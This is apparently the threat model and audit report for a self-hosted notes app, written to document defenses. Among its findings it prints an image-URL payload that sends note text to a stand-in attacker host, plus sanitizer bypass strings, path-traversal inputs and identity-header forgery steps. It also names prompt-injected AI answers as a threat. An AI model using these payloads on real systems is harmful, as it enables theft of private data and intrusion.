# Voyager: threat model and security audit

This is the security view of Voyager: what it protects, from whom, where the trust boundaries are in each way of running it, and which control holds each boundary. It also records the adversarial audit of 2026-11-02 (findings, fixes, and the risks that remain) and the hardening advice that follows from it. [DESIGN.md](DESIGN.md) §2.4, §5.3, §5.13, §5.14 and §5.40 are the design of the controls; this document does not repeat their details. How to report a vulnerability: [SECURITY.md](../SECURITY.md) at the repository root.

## 1. What is protected

| Asset | Where it lives | Why it matters |
|---|---|---|
| **The vault**: notes, attachments, settings, tasks, bookmarks, flashcard records | `/data/vault` (and `/data/vaults/<name>` for extra vaults) | Private by nature: journals, passwords people paste into notes, work notes. Read access is the main prize; write access lets an attacker plant content (or scripts, §3.8) that the owner later opens. |
| **History** | `/data/vault/.git` | Every version of every note, including text the owner deleted. Restoring it is how an attack is undone, so its integrity matters too. |
| **Secrets** | `/data/secrets` (mode 700): the Claude Code OAuth token or Anthropic API key, `ntfy.json`, `push.json` (the Web Push VAPID private key and the subscribed devices), the mirror token (or Compose secrets in `/run/secrets`) | Each opens something outside the app: the owner's Claude subscription or API spend, a GitHub repository holding the whole history, push notifications to the owner's phone. |
| **Published snapshots** | `/data/publish` | Public by intent, but only what the owner published, as it was when published. |
| **The owner's devices** | Browsers (iPhone PWA, Windows), the desktop app, the clipper extension | Content rendered there must not run code, load from other sites by itself, or impersonate the app. Their offline caches hold note text. |
| **Availability** | The one server | A crash loop or a full disk takes the notes away from every device at once. |

There is **no app login**. Admission is Tailscale identity (the `Tailscale-User-*` headers that `tailscale serve` sets) checked against `notes.identity.allowed-logins`, which names the **owners**. Every owner has full read and write access to every vault: there are no per-user permissions among owners. Since family sharing (ROADMAP item 43, §3.12), every other Tailscale login is a **guest**, admitted only to the guest surface, where it reaches only the notes and folders shared with it. With the list empty, every login `tailscale serve` passes on is an owner and sharing is off.

## 2. Who might attack

| | Attacker | Realistic goal |
|---|---|---|
| A1 | Anyone on the internet | Reach the app through Funnel or a misconfiguration; abuse the public publish server. |
| A2 | A device on the server's **LAN** (guest Wi-Fi, a compromised IoT device) | Talk to a published container port directly and forge identity headers. |
| A3 | A **tailnet peer that is not the owner**: a tagged device, a user the node is shared with, another member when the allowlist is empty, a family member something is shared with (a guest, §3.12) | Use the app as if it were the owner; as a guest, read or write beyond what is shared with it. |
| A4 | **Content**: a web page that is clipped or pasted, an imported Obsidian vault, a downloaded PDF or SVG, a shared note, a prompt-injected AI answer | Run code in the app's origin, exfiltrate notes (to a remote image URL, for instance), draw a fake UI, crash the server. **The most realistic attacker**: the owner brings the content in themselves. |
| A5 | A **website the owner visits** while the app is open | CSRF, DNS rebinding, reading API responses cross-origin, opening `/clip` with prepared content. |
| A6 | A **compromised dependency** or other code running next to the app | Reach the tailnet or the LAN from the server; read secrets. |
| A7 | **Other containers or processes on the host** | Reach the app's port without going through `tailscale serve`. |

Out of scope: an attacker with root on the server or on one of the owner's devices, and Tailscale itself being broken.

## 3. Deployment layouts and their trust boundaries

The app trusts the `Tailscale-User-Login` header absolutely. **Whatever can open a TCP connection to the app's HTTP port can therefore be anyone it likes.** Each layout is safe exactly as far as it limits who can open that connection.

### 3.1 Main layout (`deploy/docker-compose.yml`, DEPLOY.md)

The app shares the network namespace of a kernel-mode `tailscale` container and listens on `127.0.0.1:8080` only. `tailscale serve` (in the same namespace) terminates TLS on `:443`, deletes client-supplied `Tailscale-User-*` headers and sets the real ones. Nothing outside the namespace can connect to `127.0.0.1:8080`; tailnet packets for `100.x.y.z:8080` find no listener (kernel mode). The app refuses to start when it sees no kernel Tailscale interface (`TailscaleInterfaceCheck`), so a dropped `TS_USERSPACE: "false"` cannot silently forward every tailnet port to loopback. `NOTES_IDENTITY_ALLOWED_LOGINS` is mandatory here. **Identity headers cannot be forged** in this layout.

### 3.2 CasaOS simple layout (`deploy/casaos-compose.yml`, CASAOS.md)

Tailscale runs on the **host**; `tailscale serve --https=8443 http://127.0.0.1:18095` proxies to the app. Since 2026-11-02 (finding F5) the app shares the **host's network** (`network_mode: host`) and listens on `127.0.0.1:18095`, the host's loopback: no port is published, so nothing on the LAN or the tailnet can open a connection to it, IPv4 or IPv6. `NOTES_IDENTITY_ALLOWED_LOGINS` is required in this file (a placeholder that makes nobody an owner until it is replaced: every login is then a guest, and without an owner no share exists, so no note is reachable). Consequences:

- **A2 and A3 cannot reach the app** at all: a connection to `<server-ip>:18095`, the host's IPv6 addresses (link-local included) or `100.x.y.z:18095` is refused by the host's kernel.
- **Processes on the host** can still connect to `127.0.0.1:18095` and send any identity headers. The host is inside the trust boundary in every layout (it holds the data folder and the Docker socket).
- **A7**: other containers reach the app only if they share the host's network too; the optional Voyager Whisper app does (on `127.0.0.1:18097`, loopback only) and the backup app does not need to.
- The optional publish server (DESIGN §5.28) also stays on the loopback (`NOTES_PUBLISH_ADDRESS` defaults to `127.0.0.1`); Funnel reaches it through the host's `tailscale funnel`.

**The older bridge variant** (a published `18095:8080` with `SERVER_ADDRESS: 0.0.0.0`, the CasaOS file before 2026-11-02) is the weakest layout: Docker publishes the port on **every interface of the host**, and

- **A2 can forge identity.** Any device on the LAN can send `Host: homeserver.<tailnet>.ts.net` and `Tailscale-User-Login: <any or the owner's login>` to `http://<server-ip>:18095` and is admitted with full access. The tailnet name is public (certificate transparency logs list `*.ts.net` certificates), and with `NOTES_IDENTITY_ALLOWED_LOGINS` unset any login works. The Host allowlist and the identity check stop browsers, not programs.
- **A3 can forge identity too**, through the host's tailnet address (`100.x.y.z:18095`), unless the tailnet policy blocks that port.
- **A7**: other containers on the compose network reach `notesapp:8080` directly.
- A source-address check in the app cannot close this. Connections that `tailscale serve` makes to `127.0.0.1:18095` reach the container through Docker's userland proxy and arrive from the bridge gateway, and so do connections from the LAN to the host's **IPv6** addresses (link-local ones included), which the same proxy forwards to the IPv4-only container. The two are indistinguishable inside the container.

Whoever keeps that variant must close the port at the network level (§7.1); until then, treat it as **"anyone on the LAN can read and change the vault"**.

### 3.3 CasaOS sidecar layout (`deploy/casaos-compose-sidecar.yml`)

A `tailscale` container and the app share a private Compose network (`notes-internal`); the app publishes no port and listens on `0.0.0.0` inside that network, and `tailscale serve` proxies to `http://notesapp:8080`. Only containers on `notes-internal` (the tailscale container) can connect. Identity headers cannot be forged from the LAN or the tailnet. The Tailscale interface check is off (Tailscale is in another container), so the kernel-mode guarantee rests on `TS_USERSPACE: "false"` in the compose file.

### 3.4 Public publishing through Funnel (DESIGN §5.28)

Off unless `NOTES_PUBLISH_ENABLED=true` **and** the tailnet policy grants `funnel` **and** serve has an `AllowFunnel` entry. Even then Funnel reaches only the **publish server**, a separate JDK `HttpServer` (`127.0.0.1:8081`) that answers `GET`/`HEAD` for `/p/<slug>`, `/p/<slug>/<asset>` and `/p/-/style.css`, matched on the raw path, from snapshots written to `/data/publish` (outside the vault) at publish time. No controller, filter, API route or vault file is reachable on it. Every response carries `default-src 'none'` (no script can run), `X-Robots-Tag: noindex`, and `sandbox` on assets. The app on `:443`/`18095` refuses any request carrying `Tailscale-Funnel-Request` (`403 funnel-request`), health endpoints included. A snapshot leaves out frontmatter, `%% %%` and `<!-- -->` comments, raw HTML, encrypted sections, query blocks and embeds of unpublished notes.

### 3.5 The browser (the SPA, raw files, the service worker)

- **Admission and CSRF** (DESIGN §5.13, §5.14): Host allowlist (`421`, blocks DNS rebinding), identity allowlist (owners; any other login is a guest, `403 identity-not-allowed` outside the guest surface of §3.12), and on every mutating `/api/**` request (the guest API `/api/s/**` included) a well-formed `X-Client-Id` (a custom header, so a cross-origin request needs a CORS preflight, which fails: there is no CORS configuration), an `Origin` equal to the `Host` when present, and a same-origin `Sec-Fetch-Site` when present. JSON endpoints accept only `application/json`; uploads accept any type but need the header too. `GET` never has side effects. `/capture/share` (the PWA share target) accepts a form `POST` but only redirects.
- **CSP** on every page: `script-src 'self' 'wasm-unsafe-eval'`, no inline script, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, `connect-src 'self'`. `img-src` and `media-src` allow `https:`, because Obsidian notes embed remote images: **the CSP does not stop a page from loading a remote image**, so "nothing loads from other sites" is the sanitizer's job (next item).
- **Raw files** (`/api/files/raw`, history, trash): `nosniff`, a sandbox CSP, HTML, XML and JavaScript forced to `application/octet-stream` + `attachment`, SVG inline only under `sandbox`, symlinks never served.
- **Rendered note HTML** (reading pipeline, Live Preview widgets, embeds, script output, AI answers): DOMPurify plus the app's own rules: reserved attributes stripped (a note cannot forge an embed), no `position: fixed|sticky` or `z-index`, every remote load removed when remote images are off (always for script output and AI answers), and a `contain: paint` box around everything rendered so it cannot draw over the app.
- **Service worker**: same-origin only; caches the app shell and content-addressed media, never API responses.

### 3.6 The web clipper (browser extension and bookmarklet, DESIGN §6.27.1)

Neither ever calls the API (an extension origin fails the Origin check). Both hand the clip to the app's `/clip` page with `postMessage`. `/clip` accepts a message only from its own origin (the extension's content script runs in the page's window) or from its `opener` (the bookmarklet), and **saves without a click only for same-origin senders**; a clip from any other window is a preview that the owner saves with a click. `/clip` cannot be framed. The extension asks for no host permission at install, reaches the clipped tab through `activeTab`, and downloads images with `credentials: 'omit'`.

### 3.7 The desktop app (Electron, DESIGN §6.39)

Every window: `contextIsolation`, `sandbox`, no Node integration, no `<webview>`, `webSecurity` on. Navigation stays on the configured server origin; other `http(s)`/`mailto` links go to the default browser, anything else is blocked. Permissions: notifications, clipboard write, fullscreen and the microphone only, for the server's origin only. IPC messages are accepted only from the frame that may send them (the server's pages, or the shell's own `file:` pages). Plain `http` is accepted only for loopback servers. Certificate errors are not overridden.

### 3.8 Scripts in notes (DESIGN §6.43.1)

Note scripts run in QuickJS inside a dedicated worker whose own CSP forbids every network access, with CPU, memory, output and wall-time limits. The host API is read-only (no writes, no fetch). The output is data, turned into Markdown and rendered like a note **with remote loading off**, so a script that read the vault cannot send it anywhere in an image request. Scripts run as soon as the note shows (`auto`, the default), so **a note from an untrusted source is code that can read the whole vault**; only the rendering rules keep it from sending what it read away. Settings › This device › Scripts in notes can be set to *Ask before running*.

### 3.9 AI providers (DESIGN §5.25)

Off until the owner turns it on and gives a credential. A question sends the question and the text of the notes it needs (never of excluded folders, never encrypted sections) to Anthropic: **that text leaves the tailnet**. The Claude Code CLI runs with every tool disabled, an empty home and working directory, a clean environment and the token only in the environment. Answers are untrusted content (a note can prompt-inject them) and render with remote loading off.

### 3.10 Outbound connections

| Connection | Destination comes from | Note |
|---|---|---|
| Mirror push | `NOTES_MIRROR_URL` (deploy configuration) | The whole history leaves for that repository. |
| AI | Fixed (`api.anthropic.com`, or the CLI) | §3.9. |
| ntfy (alerts, reminders) | `/data/secrets/ntfy.json` | A token is sent only over https, or http to a loopback or tailnet host. |
| Transcription | `NOTES_TRANSCRIPTION_URL` | Normally a sidecar on the Compose network. |
| **Web Push** | **The browser that subscribed** (`POST /api/push/subscriptions`) | The only destination an API caller chooses: https only, no redirects, and (since this audit) no loopback, private, link-local or tailnet address. |

The tailnet policy of DEPLOY.md step 6 gives `tag:notes` no outgoing grant, so code on the server cannot reach the owner's devices over the tailnet. It does not restrict the LAN or the internet.

### 3.11 Multiple vaults (DESIGN §5.39)

Each extra vault is its own Spring context behind `/api/v/<name>/`; the prefix is rewritten before every filter runs, so admission, size limits, the CSRF guard and the security headers apply unchanged. Only a literal, well-formed prefix routes (no escapes, `;` parameters or dot segments). All vaults share one identity allowlist: **an owner can use every vault**. A guest's key opens only a share of the vault it was made in (§3.12).

### 3.12 Sharing with family (guests)

Family sharing (ROADMAP item 43; DESIGN §5.40 and §6.48; API.md §42) added the first identities that are admitted but are not owners. A **guest** is any Tailscale login outside `NOTES_IDENTITY_ALLOWED_LOGINS`; a request without an identity (a tagged device) is still refused everywhere, link or not.

- **The guest surface** (`HostAndIdentityFilter`; `IdentityResolver` tells owners from guests), decided on the path Spring MVC matches (`RequestPaths.of`: percent-escapes and `;` parameters cannot disguise it), never for a path with a `.` or `..` segment: any method on the guest API `/api/s` and `/api/s/**` (an extra vault's `/api/v/<name>/s/**` is routed there first), with the CSRF guard of §3.5; `GET`/`HEAD` of the guest page `/s` and `/s/**` (`/v/<name>/s/**`) and its static files (`/assets/**`, `/favicon.svg`, `/theme-boot.js`: the app's public code); and `/`, which answers `303` to `/s`. Everything else, the owner's app and API, raw files, the event stream, the service worker and the manifest included, answers a guest `403 identity-not-allowed`. `ShareAuthorizationIntegrationTest` requests every handler mapping of the application as a guest and as a stranger, so an endpoint added later is covered.
- **Keys** (`ShareAccess`): every guest endpoint names a share in its path, `/api/s/<key>/…`. A 12-character key is a share's id, which works only for the logins the share names (and for owners); a 43-character key is a capability link (256 bits from `SecureRandom`), which works for any identity that has it. Only a link's SHA-256 is stored, so neither `.notesapp/shares.json`, its git history nor a mirror reveals a working link, and the link is shown once. Any other key, an expired share and an id used by someone else all answer the same `404 share-not-found`. A key never opens another vault's share.
- **Scope** (`ShareScope`): a path passes the vault's path rules (`VaultPaths.normalize`, §4) and is then compared as a string with the share's note, or with what lies strictly under its folder, before any file is touched: outside answers `403 outside-share`, whether the file exists or not. Raw reads may also be the images, audio, video and PDFs outside the share that a shared note embeds now.
- **Embeds a guest adds**: an edit share's save is scanned, and an embed that resolves outside the share is accepted only when it is media the share embeds now or did within 24 hours; anything else is `403 outside-share`, so a guest cannot read a file by typing its name. Guests save and create notes only: no delete, move, rename, upload or folder.
- **Rate limit** (`ShareRateLimiter`, server-wide): `404 share-not-found` and refused paths count against the login; after 20 in 15 minutes every guest request of that login answers `429 too-many-attempts` until the oldest leaves the window. It slows the probing of ids, names and paths; it is not what protects links (their 256 bits are).
- **Live sync** (`GuestEventFilter`): a guest's event stream carries only the share's file events (and its embedded media's), moves the share followed, `share.changed` and `resync`; the share is checked again at every event and heartbeat, so revoking it, an expiry or a removed recipient ends the stream at once.
- **The guest page** (`share.html`) runs none of the owner's app: `share/importGraph.test.ts` follows every import of its entry, lazy chunks included (the formula engine's), and fails if one reaches the owner's singletons or API client.
- **What a guest can do to the owner**: an edit share's guest writes note content, script and `dataview` blocks included, that the owners later open; scripts run as the note shows (§3.8, R3). A guest's commits carry the guest's name and login, so history shows who wrote what. An embed's resolution can change later (a same-named file inside the share deleted), a known limit of DESIGN §5.40.

## 4. Controls by boundary

| Boundary | Attackers | Controls |
|---|---|---|
| Network → app port | A1, A2, A3, A7 | Layout (§3): loopback-only listener or private Compose network; kernel-mode Tailscale check; the CasaOS simple layout listens on the host's loopback (§3.2), and only its older bridge variant needs §7.1. |
| `tailscale serve` → app | A3 | Identity allowlist (`NOTES_IDENTITY_ALLOWED_LOGINS`: the owners; any other login only the guest surface, §3.12); Host allowlist; Funnel requests refused. |
| Guest → shared notes | A3 (a guest), A4 | §3.12: the guest surface on the matched path (`HostAndIdentityFilter`); share keys (`ShareAccess`: ids for the named logins, hashed 256-bit links, one `404` for every refusal); scope before any file is touched (`ShareScope`); embedded media only while embedded, and no embed a guest adds may reach outside; the rate limit (`ShareRateLimiter`); the filtered event stream (`GuestEventFilter`); a guest page that runs none of the owner's app. |
| Browser → API | A5 | Custom-header CSRF guard, Origin and `Sec-Fetch-Site` checks, no CORS, JSON-only bodies, side-effect-free `GET`. |
| API → disk | A3, A5 | `VaultPaths` (§5.3): NFC, no `.`/`..`, no hidden segments (`.git`, `.notesapp`, `.trash` → `403`), Windows name rules, symlink and junction escape checks, `NOFOLLOW_LINKS` everywhere. |
| Content → browser | A4 | CSP, raw-file sandboxing, DOMPurify + app rules, containment, remote-load blocking, script sandbox. |
| Content → server | A4 | Size limits (16 MB JSON, 100 MB uploads, 5 MB text), search regex timeout and concurrency limit, YAML alias and size limits, Jackson nesting limits, PDF size, page, time and crash limits (§5). |
| Server → elsewhere | A6 | Tailnet policy with no grant from `tag:notes`; Web Push destinations limited to public addresses; secrets readable by uid 1000 only. |
| Internet → published pages | A1 | Separate server, raw-path matching, snapshots outside the vault, no-script CSP. |

## 5. Audit of 2026-11-02

**Method.** Code review of the backend, the web app, the service worker, the desktop shell and the clipper against §2, and an attack run against a production-like backend (`allow-default` off, a Host allowlist, an identity allowlist, publishing on, two vaults; `curl` and raw sockets) plus the web app in a real Chromium for the rendering findings. Dependencies: `npm audit` for `frontend/`, `clipper/` and `desktop/`, and every runtime Maven artifact (`mvn dependency:list`) checked against the GitHub Advisory Database (OWASP dependency-check needs the full NVD feed, which is not practical offline).

### 5.1 Findings

| ID | Severity | Finding | Status |
|---|---|---|---|
| F1 | **High** | Remote-load blocking matched URL text: `https:\\host\x`, `/\host/x`, a srcset's later candidate, `u\rl()` in a style and SVG `fill="url(https://…)"` all loaded from another site with remote images off. A **note script** (runs as the note shows, can read the whole vault) could send any note to any site: `show('<img src="https:\\\\attacker\\x?d=' + text + '">')`; so could a prompt-injected AI answer, and any note could defeat "Load remote images: off". Reproduced in Chromium. | Fixed: URLs are resolved as the browser resolves them (`render/urlSafety.ts`), DESIGN §5.14 #7 |
| F2 | Medium | The inline-style filter split on `;` and `:` and missed `/**/position:fixed`, `p\osition:fixed` and `--p:fixed;position:var(--p)`; Live Preview callouts render note HTML without containment. A callout in a note (a clipped page, an imported vault) could cover the whole window with a fake "session expired" screen. | Fixed: only plainly spelled declarations survive; a Live Preview callout is `contain: paint` |
| F3 | Medium | A 780 KB PDF whose content stream inflates to one 800 MB string makes PDFBox exhaust the heap; with `-XX:+ExitOnOutOfMemoryError` the JVM exits, and since PDF text is extracted at every start until cached, **one attachment put the server in a crash loop** until it was removed over SSH. | Mitigated: an extraction marker makes such a file cost one restart, after which it is indexed by name only (DESIGN §5.5.10). See R4 |
| F4 | Low–medium | Web Push endpoints could be any `https` URL; the server posts to them, and `POST /api/reminders/test` reported the kind of failure. Any admitted caller could make the server post to `127.0.0.1`, the LAN, the Docker gateway, `169.254.169.254` or the tailnet, and port-scan them (an open HTTP port answered "plaintext connection?", a closed one `ConnectException`). | Fixed: non-public addresses refused at subscription and, after resolving the name, at every send (API.md §28.2). See R5 |
| F5 | **Critical in that layout** | CasaOS simple layout: port `18095` is published on every host interface, so any LAN device (and the host's tailnet address) can send forged `Tailscale-User-Login` and `Host` headers and gets full access. The app cannot tell these connections from `tailscale serve`'s (§3.2). | Fixed on 2026-11-02: the app shares the host's network and listens on `127.0.0.1:18095` only, and `NOTES_IDENTITY_ALLOWED_LOGINS` is required (§3.2, CASAOS.md). The firewall rules (§7.1) remain for the older bridge variant. See R1 |
| F6 | Low | Outside the dev profile, an empty `NOTES_IDENTITY_ALLOWED_LOGINS` (the CasaOS default) admits every Tailscale identity, users the node is shared with included, and `allow-default` admits requests without identity, both silently. | Startup warning (DESIGN §5.13); see §7.2 |
| F7 | Medium | Dependencies with published advisories: Tomcat 11.0.24 (four critical ones, in HTTP/2 SNI checks and the FORM/DIGEST authenticators and security constraints, none of which Voyager uses), Jackson 3.1.5 and 2.21.5 (high: parser and databind denial of service; the app parses untrusted JSON), `lodash-es` 4.17.21 under Mermaid (high: `_.template`, `_.unset`/`_.omit`; not called with untrusted input) and `nanoid` 3.3.3/4.0.2 under Excalidraw (high: only with non-integer or negative sizes). | Fixed: Spring Boot 4.1.2 (Tomcat 11.0.27, Jackson 3.1.7 and 2.21.7, Spring Framework 7.0.10); npm overrides `lodash-es` 4.18.1, `nanoid` 3.3.20 and 5.1.16. Remaining advisories: R7 |
| F8 | Low | `push.json` (the VAPID private key) was written with the default umask and `chmod`-ed afterwards, and a secrets folder the app created was world-readable. | Fixed: created owner-only |
| F9 | Info | The service worker accepted `/\host` as an app path for a notification's URL (`//host` to the URL parser). The URL comes from the server's own payload. | Fixed |
| F10 | Low | Formulas run on the page's thread with no time limit: `=SUM(MMULT(SEQUENCE(800,800),SEQUENCE(800,800)))` takes 6.4 s, and cost grows with the cube of the size. A table formula or a script's `formula()` in an untrusted note can freeze the tab each time the note opens. | Open: R6 |
| F11 | Info | The share target (`POST /capture/share`) accepts cross-site form posts; the service worker keeps their text and files in Cache Storage until `/capture` shows them. Nothing is saved without the owner's click. | Accepted |

### 5.2 Attacks that failed (the controls held)

- **Identity and Host**: no `Tailscale-User-Login` → `403`; a login outside the list → `403` (as audited, before family sharing; since then such a login is a guest, `403 identity-not-allowed` everywhere but the guest surface of §3.12, which `ShareAuthorizationIntegrationTest` checks for every handler mapping); `Host: evil.com`, `notes.<tailnet>.ts.net.` (trailing dot) → `421`; without them only the health endpoints answer (`UP`, no details), and the actuator exposes nothing else (`/actuator/env` → `404`); the same on `/api/v/<name>/`.
- **CSRF** on every mutating endpoint, plain and vault-prefixed: no or malformed `X-Client-Id` → `403`; a foreign `Origin` or `Sec-Fetch-Site: cross-site|same-site` → `403`; `text/plain` and form bodies → `415`; a CORS preflight gets no `Access-Control-Allow-*`; multipart is disabled; `POST /capture/share` only redirects. `GET` endpoints have no side effects, and every response is `Cross-Origin-Resource-Policy: same-origin`, so an `<img>` or `<script>` on another site cannot read a raw file.
- **Paths**, on the file, raw, upload, history, trash and vault-prefixed routes: `..`, `%2e%2e`, `..%2f`, overlong UTF-8, fullwidth dots, `%00`, `\`, absolute and drive-letter paths, alternate data streams, trailing dots and spaces, `.git`, `.GIT`, `.notesapp`, `.trash`; an upload named `../x.svg` or `.x.svg` lands in `Attachments/` under a cleaned name; `/api/v/work/../`, `/api/v/Work/`, `%2f`, `;x=1` and `/api/v//` reach no other vault. A Windows junction to a folder outside the vault is refused for reading, writing, moving into, creating under and deleting (`400`, nothing outside touched); symbolic links get the same treatment by design (§5.3 of DESIGN.md), and are covered by `VaultPathsTest` and `FilesIntegrationTest`.
- **Raw files**: HTML, XHTML, XML, JavaScript (`.js`, `.mjs`), `.webmanifest`, `.mht` and every unknown type are `application/octet-stream` + `attachment`; SVG is inline only under `sandbox`; PDF gets `default-src 'none'`; all with `nosniff`.
- **Publish server**: `/p/pub/../../`, `/p/%2e%2e/`, `/api/tree`, `/P/pub` → `404`; frontmatter, `%% %%` comments, `<script>`, `onerror`, `javascript:` links and embeds of unpublished notes are absent from the snapshot.
- **Denial of service**: `(a+)+$`-style regular expressions stop at the search timeout (`400`); 200,000-deep JSON → `400`; a 17 MB JSON body → `413` before it is read; YAML aliases are capped.
- **Script sandbox**: no network, DOM, timers or storage in the worker; the host API is read-only with checked arguments; the global object, `Function`, indirect `eval` and prototype pollution are covered by `sandbox.test.ts`. Its one leak was F1.
- **Desktop app and clipper**: navigation, new windows, permissions and IPC senders are checked as §3.6 and §3.7 say; nothing found.
- **Encrypted notes**: PBKDF2-SHA512 (210,000 iterations), AES-256-GCM with a fresh IV, keys non-extractable and memory-only; drafts, the offline cache and AI requests hold only ciphertext.
- **Elsewhere**: no XML parser (no XXE), no polymorphic JSON typing, no secret in a log line (the Claude token is passed in the environment and scrubbed from errors).

## 6. Residual risks

| | Risk | What limits it |
|---|---|---|
| R1 | **CasaOS layouts**: whoever reaches the app's port is whoever they claim to be (F5). With the shipped simple layout that is only the host itself; with the older bridge variant, the LAN. | The loopback listener of the simple layout (§3.2); for the bridge variant, §7.1. The sidecar layout (§3.3) and the main layout (§3.1) avoid it too. |
| R2 | Every owner has full access to every vault; there are no per-user permissions among owners. A guest has only its shares, but an **edit share's guest writes note content, scripts included, that the owners later open** (R3), and an embed a guest wrote may later resolve outside the share if a same-named file inside it is deleted (DESIGN §5.40). | §7.2: name the owners, and never list family there. Share for editing only with people whose notes you would open anyway; *Scripts in notes: Ask before running* (§7.5). |
| R3 | Content you import is code: scripts in notes run as the note shows and can read the whole vault (§3.8). After F1 they cannot send it anywhere, but they can show misleading output. | §7.5. |
| R4 | A crafted PDF still costs one restart (F3), and other parsers (PDFBox fonts and images, Excalidraw and canvas JSON) are bounded by size and time limits rather than memory limits. | Indexing by name after a crash; `notes.search.pdf.enabled=false` turns PDF text off. |
| R5 | Web Push: a host name that resolves to a public address at the check and to a private one at the connection (DNS rebinding) passes F4's check. Only an admitted caller can subscribe. | The tailnet policy (§7.3). |
| R6 | Formulas (in note tables, in `.sheet` files and through a script's `formula()`) and Dataview queries run on the page's thread without a time or array-size limit (F10). | Not opening the file (§7.7); *Scripts in notes: Ask* stops scripts, not formulas. A fix would evaluate them in a worker with a deadline, or cap array sizes. |
| R7 | Advisories with no fix that applies: `minimatch` (glob patterns; only in ESLint and in Glide Data Grid's styling, never with untrusted patterns), `opentelemetry-api` 1.62.0 under the Anthropic SDK (W3C `tracestate` parsing, which nothing feeds), and `electron-builder`'s dependencies in `desktop/` (packaging only, not shipped). | Re-run the checks of §8 when updating. |
| R8 | AI and the mirror send note text off the tailnet when enabled (§3.9, §3.10). | Off by default; excluded folders and encrypted sections are never sent to AI. |
| R9 | The publish server is internet-facing when Funnel is on; it is a small JDK server with no request rate limit of its own. | Tailscale Funnel in front; it serves only static snapshots. |

Changes that would remove R1, R3, R4, R5 and R6 are proposed in [ROADMAP.md](ROADMAP.md) item 44.

## 7. Hardening advice

### 7.1 Keep port 18095 to the host (CasaOS)

The shipped `deploy/casaos-compose.yml` already does: the app shares the host's network and listens on `127.0.0.1:18095` (§3.2), so there is nothing to apply. Check it from another machine: `curl -m 5 http://<server-ip>:18095` is refused at once.

Only if you keep the older bridge variant (a published `18095:8080` with `SERVER_ADDRESS: 0.0.0.0`), apply both rules (IPv4 **and** IPv6: Docker's userland proxy also listens on the host's IPv6 addresses, link-local included):

```sh
sudo iptables -I DOCKER-USER -p tcp -m conntrack --ctorigdstport 18095 --ctdir ORIGINAL -j DROP
sudo ip6tables -I INPUT -p tcp --dport 18095 -j DROP
curl -sI http://127.0.0.1:18095 | head -1        # on the host: still answers (421)
```

and make them survive reboots (`sudo apt install iptables-persistent && sudo netfilter-persistent save` on Debian and Ubuntu). From another machine, `curl -m 5 http://<server-ip>:18095` must time out, and so must `curl -m 5 -g 'http://[<server-ipv6>]:18095'`. CASAOS.md *Who can reach port 18095* has the details. The sidecar layout (§3.3) needs none of this.

### 7.2 Name the allowed logins

Set `NOTES_IDENTITY_ALLOWED_LOGINS` to your own Tailscale login(s) in every layout. Without it, every identity `tailscale serve` passes on (any member of the tailnet, and users the node is shared with) has full access. The app logs a warning at startup when the list is empty. The listed logins are the owners: never add family to the list. Any other login is a guest that sees only what you share with it (§3.12).

### 7.3 Tailnet policy

Apply DEPLOY.md step 6: `tag:notes` gets no outgoing grant, and your devices reach it on the HTTPS port only. In the CasaOS bridge variant, also make sure no grant lets tailnet peers reach the host's port `18095` (only the serve port, `8443`); the shipped simple layout listens on the loopback, which the tailnet cannot reach.

### 7.4 Secrets

`/data/secrets` mode 700, each file mode 600, owned by uid 1000 (the app creates `push.json` that way itself). Give the mirror token access to the one mirror repository only (a fine-grained token with *Contents: read and write* on that repository). Rotate the Claude token or API key if `/data` is ever copied somewhere less trusted (a backup disk included: the restic repository is encrypted, a plain copy is not).

### 7.5 Content you did not write

Scripts run as soon as a note shows. Before importing a vault or pasting notes from someone else, set *Settings › This device › Scripts in notes* to *Ask before running*, and review `script` and `dataview` blocks before running them. Keep *Load remote images* off if you clip pages often: a clipped page's images otherwise tell its site when you read the note.

### 7.6 Publishing

Everything published is public, indexed or not. Review a note before publishing it; republishing is needed for an edit to appear, and unpublishing deletes the snapshot.

### 7.7 Formulas from others

Until R6 is fixed, a note or spreadsheet whose formulas build very large arrays (`SEQUENCE`, `MMULT` over hundreds of rows; the engine allows a million rows) can freeze the tab, or exhaust its memory, for as long as they compute. If a file you did not write makes the app hang whenever it opens, move or delete it from the file explorer without opening it, or remove it over SSH.

## 8. Re-running the checks

| Check | How |
|---|---|
| npm advisories | `npm audit` in `frontend/`, `clipper/` and `desktop/` (2026-11-02: 0 high; `frontend/` 17 moderate, all the one `minimatch` advisory; `clipper/` none; `desktop/` 15 moderate, all in `electron-builder`'s packaging dependencies) |
| Maven advisories | `cd backend && ./mvnw -B -o dependency:list -DincludeScope=runtime -DoutputFile=deps.txt`, then look each `group:artifact` up in the GitHub Advisory Database (`gh api graphql` with `securityVulnerabilities(ecosystem: MAVEN, package: "group:artifact")`) and compare the version with each `vulnerableVersionRange` (2026-11-02, after F7: only `opentelemetry-api`, R7). OWASP dependency-check works too where the NVD feed can be downloaded. |
| Admission and CSRF | `SecurityIntegrationTest`, `IdentityIntegrationTest`, `MultipleVaultsIntegrationTest`, `HostAndIdentityFilterTest`, `ApiGuardInterceptorTest`; by hand, against a backend run with `allow-default` off and a Host allowlist: `curl -H 'Host: <allowed host>' -H 'Tailscale-User-Login: <login>' …` with each header left out or changed |
| Paths | `VaultPathsTest`, `FilesIntegrationTest`, `UploadIntegrationTest`; by hand, the inputs of §5.2 |
| Sharing (guests, §3.12) | `ShareAuthorizationIntegrationTest` (every handler mapping as guest and stranger; every guest endpoint as owner, recipient, link holder and stranger; paths outside the scope however spelled; the embeds a guest adds; the rate limit; revocation and expiry, streams included), `ShareIntegrationTest`, `ShareScopeTest`, `ShareRateLimiterTest`, `ShareServiceTest`, `IdentityResolverTest`, `HostAndIdentityFilterTest`; the guest page: `share/importGraph.test.ts`, `share/guestFormulas.test.ts` |
| Rendering | `render/urlSafety.test.ts`, `render/render.test.ts` (security audit cases), `render/rich/rich.test.ts`, `editor/livePreview/scripts.test.ts`, `styles/containment.test.ts` |
| Script sandbox | `scripts/sandbox.test.ts`, `scripts/host.test.ts`, `scripts/output.test.ts` |
| Web Push destinations | `WebPushTest`, `RemindersIntegrationTest` |
| This document | `ThreatModelDocTest`: the guest surface is in it, the guest controls it names are classes that exist, and so is every test this table names; `CasaOsLayoutTest` holds the CasaOS file to §3.2 |
| PDF crash guard | `PdfTextTest`; end to end: a PDF whose content stream inflates to one huge string, a server started with `-Xmx256m -XX:+ExitOnOutOfMemoryError` (it exits), then started again (it logs `reading its text stopped the server last time` and stays up) |

### 8.1 Commits of the 2026-11-02 audit (branch `fix/security-audit`)

| Commit | What |
|---|---|
